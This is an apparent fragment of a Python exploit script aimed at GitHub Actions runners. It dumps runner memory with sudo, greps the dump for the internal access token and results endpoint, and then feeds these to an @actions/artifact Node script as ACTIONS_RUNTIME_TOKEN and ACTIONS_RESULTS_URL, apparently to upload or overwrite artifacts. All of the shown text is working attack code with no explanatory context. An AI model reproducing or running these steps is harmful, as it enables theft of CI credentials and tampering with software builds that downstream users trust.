...
os.system("cd /tmp/depi/; sudo python3 dump.py; strings data | grep -i '\"accesstoken\"' | grep -i '{\"filetable' > file.json")
git_internal_data = json.loads(open("/tmp/depi/file.json").read())
results_endpoint = git_internal_data["variables"]["system.github.results_endpoint"]["value"]
access_token = os.popen("strings data | grep '\"AccessToken\": ' | sed -n '2p' | sed 's/ //g' | cut -d ':' -f2 | sed 's/\"//g'").read().strip()
...
os.system(f"cd /tmp/depi/; npm install @actions/artifact@2; ACTIONS_RESULTS_URL={results_endpoint} ACTIONS_RUNTIME_TOKEN={access_token} node index.js;")
